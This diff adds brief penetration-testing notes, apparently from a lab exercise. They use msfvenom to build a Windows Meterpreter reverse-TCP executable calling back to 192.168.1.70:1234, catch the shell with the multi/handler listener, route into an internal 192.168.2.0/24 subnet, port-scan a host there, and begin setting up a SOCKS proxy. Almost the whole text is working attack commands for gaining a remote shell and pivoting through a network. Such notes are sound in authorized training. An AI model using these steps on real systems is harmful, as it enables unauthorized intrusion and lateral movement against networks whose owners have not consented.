@@ -1,0 +1,32 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.70 LPORT=1234 -f exe -o temp.exe
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+Once you get the reverse shell, do an 'ifconfig' to get the IP and network information, then, to make our shell routable on 192.168.2.0, do...
+
+run autorun -s 192.168.2.0/24
+
+(background the shell)
+background or bg
+
+type 'route print' in metasploit and should get the route added for 192.168.2.0/24
+
+search portscan
+choose 'scanner/portscan/tcp' and set the RHOST, something such as 192.168.2.11
+set ports 1-100
+set THREADS 3
+run
+(we should see open ports, to validate the ports are opened)
+
+USING THE SOCKSPROXY
+search socks
+auxiliary/server/socks_proxy
+
+
+
+
+
+
+
